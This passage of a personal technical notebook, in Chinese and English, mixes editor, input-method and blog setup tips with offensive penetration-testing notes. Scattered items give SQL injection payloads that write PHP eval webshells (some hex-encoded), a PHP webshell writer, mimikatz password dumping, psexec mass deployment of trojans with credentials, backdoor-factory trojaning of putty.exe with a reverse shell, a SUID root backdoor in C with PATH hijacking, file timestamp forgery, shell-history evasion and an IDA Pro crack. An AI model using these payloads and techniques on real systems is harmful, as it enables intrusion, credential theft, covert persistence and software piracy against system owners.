                               setlocal makeprg=python&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;-u
                               set efm=%C&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%.%#,%A&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;File&lt;span class=&quot;se&quot;&gt;\ \&quot;&lt;/span&gt;%f&lt;span class=&quot;se&quot;&gt;\&quot;\\&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;line&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%l%.%#,%Z%&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;%^\ &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;%&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;@=%m
                               silent make %
                               copen
                               let &amp;amp;makeprg     = mp
                               let &amp;amp;errorformat = ef
                           endfunctio
   
                           然后添加:
                           map &lt;span class=&quot;nt&quot;&gt;&amp;lt;F5&amp;gt;&lt;/span&gt; :call CheckPythonSyntax()&lt;span class=&quot;nt&quot;&gt;&amp;lt;CR&amp;gt;&lt;/span&gt;
                         2&amp;gt;在vimrc文件中加nnoremap &lt;span class=&quot;nt&quot;&gt;&amp;lt;buffer&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;F9&amp;gt;&lt;/span&gt; :exec &#39;!python&#39; shellescape(@%, 1)&lt;span class=&quot;nt&quot;&gt;&amp;lt;cr&amp;gt;&lt;/span&gt;(1更好)
    vim进阶:http://coolshell.cn/articles/5426.html&lt;span class=&quot;sb&quot;&gt;

    my tmux配置:
        #https://github.com/tmux/tmux     安装最新版本
        https://github.com/gpakosz/.tmux 安装比较好的配置
        echo $EDITOR
        export EDITOR=vim
        echo $EDITOR
        http://blog.csdn.net/g1036583997/article/details/50466499    tmux提制模式
        http://cenalulu.github.io/linux/tmux/

    ubuntu安装Oh-My-Zsh:
        https://zhuanlan.zhihu.com/p/19556676
        http://www.jianshu.com/p/9a5c4cb0452d
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;75.&lt;/span&gt;1&amp;gt;dmz+光猫+有线路由+无线路由下的端口映射:
   2&amp;gt;拓扑图大致为:
          光猫(192.168.1.1)
           ｜
        有线路由
           ｜        
        无线路由(192.168.3.1)
           ｜        
          内网(192.168.3.x)
   3&amp;gt;其中光猫含有路由器功能,此处有线路由相当于集线器功能
   4&amp;gt;如果在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4(此ip可在无线路由的wan口所在ip值看到,此ip值由光猫上的dhcp随机分配)
   5&amp;gt;wan口和lan口区别:&amp;gt;每个路由器有wan口和lan口,光猫拨号,其wan口ip为internet接口所在ip,一般为动态获取的一个值,其lan口ip为192.168.1.1(此ip可在光猫上人工设置成任意192.168.x.1形式)
                  　&amp;gt;无线路由的wan口ip为光猫所在局域网的ip段中的ip:192.168.1.4,lan口ip为192.168.3.1(此ip可在无线路由器上人工设置成任意192.168.x.1形式)
   6&amp;gt;不加dmz时的内网端口映射:光猫上设置nat:将外部数据转到192.168.1.4及对应端口,无线路由器上设置nat:将外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口
   7&amp;gt;加dmz时的内网端口映射:在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4,在无线路由器上设置nat:将外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口(其中dmz相当于转发光猫上的所有端口数据到无线路由器上,外部访问光猫公网ip即相当于访问无线路由)
&lt;span class=&quot;p&quot;&gt;76.&lt;/span&gt;内网渗透 代理&amp;amp;转发 http://www.heysec.org/archives/115
&lt;span class=&quot;p&quot;&gt;77.&lt;/span&gt;union select 1,2,3,4,load_file(0x433a5c666c76706c617965725c6e756c6c6576742e6d6f66),6 into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;-- - (路径中用/不用&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;
   写一句话是select 1,2,3,4,&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&lt;/span&gt;,6 into outfile &#39;c:/ksla/lsd/&#39;-- -　　　　(outfile=dumpfile,but if not,try dumpfile instead of outfile in the first sentence)
   mysql中phpmyadmin提权:http://blog.sina.com.cn/s/blog_b8ab0ac20101sbwe.html
   udf:http://www.cnblogs.com/qing123/p/4676808.html
   outfile和dumpfile区别:http://www.dedecms.com/knowledge/data-base/mysql/2012/0819/7569.html
   在phpmyadmin中
   SELECT HEX(LOAD_FILE(0x2f70687073747564792f7777772f72654475682e706870))INTO DUMPFILE　&#39;/phpstudy/www/121.txt&#39;    (/phpstudy/www/reDuh.php)  本地(linux)取hex值
   select unhex(&#39;...&#39;) into dumpfile &#39;c:/inetpub/wwwroot/memberinfo/....php&#39;;-- -成功,这样不会被转义,如果是outfile会被转义　远程dumpfile出去 (对方windows)
   同理写shell:bs/news.php?id=3 and 1=2 union select null,null,null,null,unhex(&#39;3C3F70687020406576616C28245F504F53545B27746F6D275D293B3F3E&#39;) into dumpfile &#39;C:/AAWServer/www/php/k82.php&#39;;
&lt;span class=&quot;p&quot;&gt;78.&lt;/span&gt;有时候visual studio2015或其它版本的ide编译出来的exe文件无法在其它机器上运行(release版本也不可以的时候)可以直接试试g++/gcc -o out.exe file.cpp等命令自行编译.
&lt;span class=&quot;p&quot;&gt;79.&lt;/span&gt;ctrl+shift+p==&amp;gt;install==&amp;gt;package syning,backup sublime settings==&amp;gt;https://github.com/csch0/SublimeText-Package-Syncing
&lt;span class=&quot;p&quot;&gt;80.&lt;/span&gt;http://www.tuicool.com/articles/zIJrEjn GitHub上README写法暨markdown语法解读
&lt;span class=&quot;p&quot;&gt;81.&lt;/span&gt;windows下cacls查看权限和设置权限http://41080138.blog.51cto.com/2587513/951403
&lt;span class=&quot;p&quot;&gt;82.&lt;/span&gt;php写shell: cmd=fputs(fopen(&#39;chk.php&#39;,&#39;w&#39;),&#39;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php @eval($_POST[nihao]); ?&amp;gt;&lt;/span&gt;&#39;);
   其中nihao的位置不能有&#39;&#39;或&quot;&quot;,而且fputs的第二个参数只能用单引号包住
&lt;span class=&quot;p&quot;&gt;83.&lt;/span&gt;rdesktop -u administrator -p nihao103.240.203.6:3389
&lt;span class=&quot;p&quot;&gt;84.&lt;/span&gt;到最外面调时间,拉到中间没到最外面调星期和日期(中间时,顺时针调星期,逆时针调  
   日期)
&lt;span class=&quot;p&quot;&gt;85.&lt;/span&gt;windows 2003,stop firewall service and policy command:net stop sharedaccess, net stop policyagent
   load  mimikatz
   mimikatz_command -f sekurlsa::searchPasswords
    -slave 103.240.203.6 200  202.177.192.16 3389
    local:-listen 
&lt;span class=&quot;p&quot;&gt;86.&lt;/span&gt;sa权限上传文件九种方法:http://www.csdn123.com/html/20130308/49/019024fd66e9a1a793e4344a6cc47175.htm
&lt;span class=&quot;p&quot;&gt;87.&lt;/span&gt;内网渗透:http://www.pojie567.com/blog/?post=5186
             http://www.1990day.com/regeorg-proxychains-gold-partner/
             http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
             http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
             https://www.91ri.org/tag/neiwang-hacker
             http://drops.wooyun.org/tips/6617   导出当前域内所有用户hash的技术整理
             http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
             http://cracer.com/?p=1247  拿下域控后批量种马:psexec.exe @pc.txt -u ABIMAQ&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator -p k78m90 -c c:&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;av&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;009.exe
             http://drops.wooyun.org/tips/12021   拿下域控权限
   快速找出dc:
            dsquery server(best)
            nslookup -type=SRV _ldap._tcp.baidu.com
            netdom query fsmo
            net group &quot;domain controllers&quot; /domain
&lt;span class=&quot;p&quot;&gt;88.&lt;/span&gt;ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
&lt;span class=&quot;p&quot;&gt;89.&lt;/span&gt;github pages+jekyll搭建个人博客:
        https://www.zhihu.com/question/20223939
        https://github.com/jacobtomlinson/carte-noire
        http://www.tuicool.com/articles/RZbEV3
        https://help.github.com/articles/configuring-jekyll/
        https://help.github.com/articles/setting-up-your-github-pages-site-locally-with-jekyll/
        http://jekyllrb.com/docs/github-pages/#project-page-url-structure
        http://jekyllcn.com/
        https://learnetto.com/blog/tutorial-how-to-host-your-websites-for-free-using-github-pages
        http://pikipity.github.io/blog/kramdown-syntax-chinese-1.html   kramdown语法
        http://pikipity.github.io/blog/kramdown-syntax-chinese-2.html   kramdown语法
        http://platinhom.gitcafe.io/2015/11/06/Kramdown-note/           kramdown语法
        https://ruby-china.org/topics/14005                             web中文字体应用指南(i use 文泉驿等宽正黑 )
        http://platinhom.github.io/2015/06/06/Markdown-note/
        http://xinghuacai.github.io
        http://reyhan.org/2013/03/jekyll-archive-without-plugins.html   jekyll archive by year
        myblog/posts-by-categories.html                                 jekyll archive by categories
        http://www.ithome.com/html/it/195970.htm                        add music to my pages
&lt;span class=&quot;p&quot;&gt;90.&lt;/span&gt;kali2.0使用pptp vpn时,需要在高级选项里勾选使用点到点加密,如果还不行则选择最安全的加密(128位),否则不能成功连接,另外,用不了l2tp vpn,不知系统哪里的问题
&lt;span class=&quot;p&quot;&gt;91.&lt;/span&gt;https://ghostbin.com/  :-&amp;gt; paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
                                                             from:
                                                             http://drops.wooyun.org/pentesting/15117
&lt;span class=&quot;p&quot;&gt;92.&lt;/span&gt;kali2安装rime输入法:https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
                       https://wu.nerd.moe/?p=1752
                       /usr/bin/rime_dict_manager自带词库管理工具
                            kali_local:/root/.config/fcitx/rime/wubi86.userdb.kct
                            windows:%appdata%&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ime&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ubi86.userdb.kct
                       http://www.jianshu.com/p/cffc0ea094a7
                       https://github.com/rime/home/wiki/CustomizationGuide
                       重新部署使配置生效:---&amp;gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx&lt;span class=&quot;sb&quot;&gt;

                       pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;;nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
                       emoji对应表:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
                       新建default.custom.yaml,内容为patch:...,意思是要覆盖default.yaml中配置,其它如wubi_pinyin.yaml等对应wubi_pinyin.custom.yaml
                       eg.my default.custom.yaml file:
                       ---------------------start------------------------
                            patch:
                                menu/page_size: 9
                                schema_list:
                                  - schema: luna_pinyin
                                  - schema: luna_pinyin_fluency
                                  - schema: luna_pinyin_simp
                                  - schema: wubi_pinyin
                                  - schema: wubi86
                                  - schema: emoji
                                ascii_composer:
                                  good_old_caps_lock: true
                                  switch_key:
                                    Caps_Lock: clear
                                    Control_L: noop
                                    Control_R: commit_text
                                    Eisu_toggle: clear
                                    Shift_L: commit_code
                                    Shift_R: inline_ascii
                      --------------------end----------------------------
    windows中rime词库文件位置:%APPDATA%\rime
    深蓝词库转换工具:
                    https://github.com/studyzy/imewlconverter
                    http://www.cnblogs.com/studyzy/archive/2013/01/10/2855403.html

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;93.&lt;/span&gt;windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;amp;form=MSHOME
&lt;span class=&quot;p&quot;&gt;94.&lt;/span&gt;backdoor-factory用法:
&lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;单独的backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
                             backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
                             backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former &#39;show&#39; command) -H vps&#39;s ip -P 200
&lt;span class=&quot;p&quot;&gt;    2.&lt;/span&gt;backdoor-factory in veil:--&amp;gt;veil--&amp;gt;list--&amp;gt;number of native/backdoor-factory--&amp;gt;options--&amp;gt;set the options
&lt;span class=&quot;p&quot;&gt;95.&lt;/span&gt;aspx大马连接报错&quot;/&quot;解决方法:http://www.asp-muma.com/?post=97
   my way defferent from uppon one:
   create a new folder,create a web.config file with below content:
   --------------------------content------------------------
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;system&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;customErrors&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Off&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;/system.web&amp;gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
   --------------------------end of content----------------
   then upon a strong webshell to my new created folder,found no more error.
&lt;span class=&quot;p&quot;&gt;96.&lt;/span&gt;百度云上传限制绕过:copy 1.rmvb /b + hunxiao.txt /a 1-hunxiao-txt.rmvb
&lt;span class=&quot;p&quot;&gt;97.&lt;/span&gt;windows中ping google &amp;amp;&amp;amp; ping baidu ==&amp;gt;ping.bat:
                                         cmd /k &quot;ping www.google.com.hk &amp;amp;&amp;amp; ping www.baidu.com&quot;
   创建ping.bat文件的快捷方式,在快捷方式中添加快捷键.eg.ctrl+alt+p
&lt;span class=&quot;p&quot;&gt;98.&lt;/span&gt;linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid.conf default_port:3128
&lt;span class=&quot;p&quot;&gt;99.&lt;/span&gt;booklist:http://www.jianshu.com/p/67e294106919
&lt;span class=&quot;p&quot;&gt;100.&lt;/span&gt;gdb:http://www.jianshu.com/p/f20b10ea9a61
&lt;span class=&quot;p&quot;&gt;101.&lt;/span&gt;study links:
    http://www.shiyanbar.com/questions/733
    http://ch3rish.lofter.com/post/1d503b96_791362d
&lt;span class=&quot;p&quot;&gt;102.&lt;/span&gt;linux中suid,sgid,sticky详解:http://crazyming.blog.51cto.com/1048571/467414
    find / -type f -perm -4000 -ls &amp;gt; tmp.txt   function:find suid files
        find / -type f -perm -4000 -ls | grep &quot;flag00&quot; &amp;gt; tmp.txt    function:find file has setuid=flag00
    find / -type f -perm -2000 -ls &amp;gt; tmp.txt   function:find sgid files
    find / -perm -2 -type f -print             function:find files can be writeable by everyone
        echo &quot;/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh&quot; &amp;gt;&amp;gt; writeable_file_if_it_is_from_any_autorun_directory
        /tmp/.sh -p(this command to get a euid=root shell)
&lt;span class=&quot;p&quot;&gt;103.&lt;/span&gt;linux中好用的find命令:http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2?print
&lt;span class=&quot;p&quot;&gt;104.&lt;/span&gt;one linux backdoor shell can be like this:(file.c)
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdlib&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;unistd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdio&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    
    int main(int argc, char &lt;span class=&quot;gs&quot;&gt;**argv, char **&lt;/span&gt;envp)
    {
    	gid_t gid;
    	uid_t uid;
    	gid = getegid();
    	uid = geteuid();
    
    	setresgid(gid, gid, gid);
    	setresuid(uid, uid, uid);
    
    	system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);
    }&lt;span class=&quot;sb&quot;&gt;

    to use this file as a root shell backdoor after got a root shell,
    use root role execute:
        gcc -o 1 file.c
        mv 1 /bin/l2ping
        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
    use webshell role execute:
        PATH=/tmp:$PATH
        export PATH
        echo $PATH(to check if /tmp is in $PATH)
        ln -s /bin/sh /tmp/echo
    then use webshell role to get a root privilege shell:
        /bin/l2ping
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;105.&lt;/span&gt;linux中修改文件时间
    同时修改文件的修改时间和访问时间
    touch -d &quot;2010-05-31 08:10:30&quot; test.doc
&lt;span class=&quot;p&quot;&gt;106.&lt;/span&gt;rime全角到半角解决方法:如果主机突然变成全角而无法变回半角,从任意地方中复制一个正常的半角字符串到主机中任意地方即可,不用重启
&lt;span class=&quot;p&quot;&gt;107.&lt;/span&gt;ssh文件复制:eg.本机未登录前执行
        scp level08@192.168.2.140:/home/level08/capture.pcap /1.pcap     (remote-&amp;gt;local)
        scp /tmp.txt level08@192.168.2.140:/home/level08/                (local-&amp;gt;remote)
&lt;span class=&quot;p&quot;&gt;108.&lt;/span&gt;echo &#39;ibase=16;410&#39; | bc 
        16进制的410转换成默认10进制:out-&amp;gt;1040
    echo &#39;ibase=16;obase=2;410&#39; | bc
        16进制的410转换成2进制:out-&amp;gt;10000010000
&lt;span class=&quot;p&quot;&gt;109.&lt;/span&gt;python中ord和int:
    int(&#39;12&#39;)=12
    int(&#39;b&#39;)=error(int的参数只能是&#39;num&#39;类型)
    ord(&#39;b&#39;)=98
    ord(&#39;a&#39;)=97
    ord(&#39;0&#39;)=48
    ord(&#39;ascii&#39;)=ascii这一个字符对应的十进制整数(ascii只能是a character,not string)
&lt;span class=&quot;p&quot;&gt;110.&lt;/span&gt;书单
        http://www.heysec.org/archives/257
        https://www.zhihu.com/question/24152689
        http://m.blog.csdn.net/article/details?id=45482849
&lt;span class=&quot;p&quot;&gt;111.&lt;/span&gt;linux上ssh无法以root用户登录解决方法:
    vi /etc/ssh/sshd_config (attention!,here is not /etc/ssh/ssh_config)
    /PermitRootLogin&lt;span class=&quot;nt&quot;&gt;&amp;lt;Enter&amp;gt;&lt;/span&gt;
    change to:
        PermitRootLogin yes
&lt;span class=&quot;p&quot;&gt;112.&lt;/span&gt;gcc编译so文件:
        gcc -shared -fPIC myfile.c -o myfile.socc
&lt;span class=&quot;p&quot;&gt;113.&lt;/span&gt;wordpress 渗透工具
&lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;wpscan
&lt;span class=&quot;p&quot;&gt;    2.&lt;/span&gt;http://www.getwpxf.com/  seems better
&lt;span class=&quot;p&quot;&gt;114.&lt;/span&gt;linux中c代码中多个参数代码编写参考规范:http://blackndoor.com/nebula-level18/
&lt;span class=&quot;p&quot;&gt;115.&lt;/span&gt;一个十六进制位是4bits,0x12345678是32bits,相当于一个32位系统下的栈单元
    一个汉字是2个字符4个字节32位,4 bytes,32 bits
    一个DWORD则是4个字符8个字节64位,8 bytes,64 bits
&lt;span class=&quot;p&quot;&gt;116.&lt;/span&gt;linux安装程序
    cd program
    ./configure
    make
    sudo make install
&lt;span class=&quot;p&quot;&gt;117.&lt;/span&gt;linux提权时,编译exploit.c文件时必须在对方系统中编译,或者与对方系统一样的系统中编译,否则本地编译出exploit文件后上传到对方机器运行时会出现can not execute binary file的错误
&lt;span class=&quot;p&quot;&gt;118.&lt;/span&gt;访问目录时,404不代表文件夹一定不存在,尤其是那些不标准显示的404,有可能是webapp或waf故意这样显示的,但是404显示目录下的文件还是可以正常访问的
&lt;span class=&quot;p&quot;&gt;119.&lt;/span&gt;c_++头:
        using namespace std;
        #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;120.&lt;/span&gt;ida破解,替换ida pro根目录下的ida.key为https://gist.github.com/TheCjw/9f6f7544f33f292db20e下的key文件,然后将系统时间改成1年以前下的key文件,然后将系统时间改成1年以前
&lt;span class=&quot;p&quot;&gt;121.&lt;/span&gt;ROP就是所谓的Return Orientated Programming,早期也叫ret2libc.
&lt;span class=&quot;p&quot;&gt;122.&lt;/span&gt;html中的图标    http://fontawesome.io/icons/
&lt;span class=&quot;p&quot;&gt;123.&lt;/span&gt;fckeditor设置:hhttp://www.itpa.hk/ttp://www.jb51.net/article/17965.htm
&lt;span class=&quot;p&quot;&gt;124.&lt;/span&gt;html转pdf:
    wkhtmltopdf www.myhomepage.com myhomepage.pdf
    在线pdf编辑 http://www.pdfescape.com/
    本地pdf快速转换:chrome浏览器(全选或部分选择后)右键可打印成pdf
&lt;span class=&quot;p&quot;&gt;125.&lt;/span&gt;printf(&quot;%x&quot;):第一个栈里的值
    printf(&quot;%3x&quot;):第一个栈里的值,用3个字节长度表示
    printf(&quot;%3&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;x&quot;):第三个栈里的值(这一条适用于绝大多数的&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;nix的系统,win下不支持则用printf(&quot;%x,%x,%x&quot;)来达到同样的目的)
    宽度格式符(%3)中的%和3是不分开的,如果%3后面加了&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;(直接参数访问)则表示为打印第3个栈里的值
&lt;span class=&quot;p&quot;&gt;126.&lt;/span&gt;visual studio快速编译一个c文件
    运行C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files (x86)&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft Visual Studio 14.0&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;ommon7&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;ools&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;sDevCmd.bat
    然后运行cl md.c
    或者打开tools里面的开发人员提示符,然后再cl md.c
&lt;span class=&quot;p&quot;&gt;127.&lt;/span&gt;安装sulley过程中首先选用管理员身份安装,如果失败,再手动安装,安装要求python2.4,如果机器上已经安装了python的其他版本,需要人工将python2.4加入到环境变量中,再去sulley framework的安装目录下中的install_files中将ctypes和pcapy用管理员身份安装
&lt;span class=&quot;p&quot;&gt;128.&lt;/span&gt;sulley中的process_monitor.py中用的是os.system来启动崩溃的程序继续fuzz,这样是阻塞方式,不可以,可改成os.startfile或subprocess中的popen
    os.startfile(相当于双击操作,eg. os.startfile(&quot;1.txt&quot;)):   http://blog.sina.com.cn/s/blog_4b5039210100froh.html
&lt;span class=&quot;p&quot;&gt;129.&lt;/span&gt;my_sulley学习资料
    http://pan.baidu.com/s/1c1Y6kVY
&lt;span class=&quot;p&quot;&gt;130.&lt;/span&gt;linux中批量替换目录文件中的字符串:
    sed -i &quot;s/xinghuacai/3xp10it/g&quot; &lt;span class=&quot;sb&quot;&gt;`grep xinghuacai -rl .`&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;131.&lt;/span&gt;github在push时免输入用户名密码:
    http://www.cnblogs.com/ballwql/p/3462104.html
&lt;span class=&quot;p&quot;&gt;132.&lt;/span&gt;mysql中表名为关键字的处理方法,&lt;span class=&quot;sb&quot;&gt;`table_name`&lt;/span&gt;
    http://www.cnblogs.com/puzi0315/archive/2012/08/27/2658169.html
&lt;span class=&quot;p&quot;&gt;133.&lt;/span&gt;windows截图神器Snipaste
    http://zh.snipaste.com/
&lt;span class=&quot;p&quot;&gt;134.&lt;/span&gt;windows下rime修改备选词个数:打开default.yaml,修改对应数字
&lt;span class=&quot;p&quot;&gt;135.&lt;/span&gt;ranger:linux terminal file manage god software
&lt;span class=&quot;p&quot;&gt;136.&lt;/span&gt;github pages生成的博客本地有语法高亮而正常http://3xp10it.github.io没有语法高亮的原因:
    由于github将博客升级成https://3xp10it.github.io,而本地浏览器访问https://3xp10it.github.io时,出于安全性考虑,禁用了js
    本地生成的博客为http://127.0.0.1:4000,没有https
    解决办法:https://help.github.com/articles/securing-your-github-pages-site-with-https/
        将博客文件夹中的https变成http
&lt;span class=&quot;p&quot;&gt;137.&lt;/span&gt;终端字符串生成图像工具
    banner
    figlet
    toilet
    http://blog.chinaunix.net/uid-10540984-id-2881092.html
    https://xin053.github.io/2016/07/06/pyfiglet%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/
&lt;span class=&quot;p&quot;&gt;138.&lt;/span&gt;bind shift+e to firefox&#39;s perference shortcut key bind
&lt;span class=&quot;p&quot;&gt;139.&lt;/span&gt;制作pypi的python模块(eg.exp10it.py)时,在本地如果exp10it.py中有中文,在一个正常的py文件中如果有一句from exp10it import &lt;span class=&quot;ge&quot;&gt;*,如果这个正常的py文件中由于这句导入了相同文件夹目录下的exp10it.py模块,会由于其中的中文而产生错误,可以上传到pypi后由pip install安装exp10it模块后使用from exp10it import *&lt;/span&gt;,同时需要删除同目录下的exp10it.py文件,否则from exp10it import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;依然会优先从同目录下找exp10it.py模块
&lt;span class=&quot;p&quot;&gt;140.&lt;/span&gt;sqlmap得出经验,一般跑出只有盲注的uri注入点,一般都是由于waf拦截了普通的union注入语句,只要想办法绕过waf就可以用union来快速注入了,否则只能用sqlmap跑出来的盲注payload进行慢慢的注入,且有可能不能注入出所有数据,依然被waf拦截
&lt;span class=&quot;p&quot;&gt;151.&lt;/span&gt;python模块中声明编码为utf-8的注释代码不用放在前两行,如果出错,说明代码其他地方有误
&lt;span class=&quot;p&quot;&gt;152.&lt;/span&gt;compiz和unity的问题:
    dconf reset -f /org/compiz
    setsid unity
    unity --reset-icons&lt;span class=&quot;sb&quot;&gt;

    another:
    cd 
    rm -rf .config/apps/compiz*
    rm -rf .cache/compizconfig-1
    rm -rf .config/compiz-1
    rm -rf .compiz
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;153.&lt;/span&gt;linux清理:
    1&amp;gt;apt-get autoremove
    2&amp;gt;apt-get autoclean
    3&amp;gt;apt-get clean
    4&amp;gt;dpkg -l |grep ^rc|awk &#39;{print $2}&#39; |sudo xargs dpkg -P(一键删除残余配置文件)
&lt;span class=&quot;p&quot;&gt;154.&lt;/span&gt;ubuntu audio:http://forum.ubuntu.org.cn/viewtopic.php?t=324619
&lt;span class=&quot;p&quot;&gt;155.&lt;/span&gt;ubuntu 16.04 super+d切换到桌面的方法,在系统的键盘设置中取消导航中的隐藏所有窗口的super+d的快捷键,打开compizconfig settins manager,搜索unity,找到显示桌面的快捷键设置处,设置为super+d
&lt;span class=&quot;p&quot;&gt;156.&lt;/span&gt;pip install exp10it -U出现无法立刻升级处理办法:pip install exp10it=(local_latest_version)
&lt;span class=&quot;p&quot;&gt;157.&lt;/span&gt;grep多行匹配:(eg.匹配exp10it.py中的api)
    pcregrep -M &#39;def .&lt;span class=&quot;ge&quot;&gt;*(.*&lt;/span&gt;):&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;(.&lt;span class=&quot;ge&quot;&gt;*#.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;){1,10}&#39;
&lt;span class=&quot;p&quot;&gt;158.&lt;/span&gt;linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法:
    ps -aux | grep &quot;vmware&quot;
    kill pid_of_error_machine
&lt;span class=&quot;p&quot;&gt;159.&lt;/span&gt;google dock:
    site:xxx.xxx.xxx inurl:union select
&lt;span class=&quot;p&quot;&gt;160.&lt;/span&gt;my own github&#39;s md file:
    每行111个字节长度,但是写md时并不用在vim中设置111个字节长度后自动换行,因为md文件会在应该换行的时候自动换行,只要将一段的内容写到md文件中的一行中即可
&lt;span class=&quot;p&quot;&gt;161.&lt;/span&gt;echo $HISTCONTROL,如果结果为ignoreboth,执行命令时先加空格再输入命令则history不会记录
&lt;span class=&quot;p&quot;&gt;162.&lt;/span&gt;github-pages 使用多说
    http://www.ituring.com.cn/article/114888
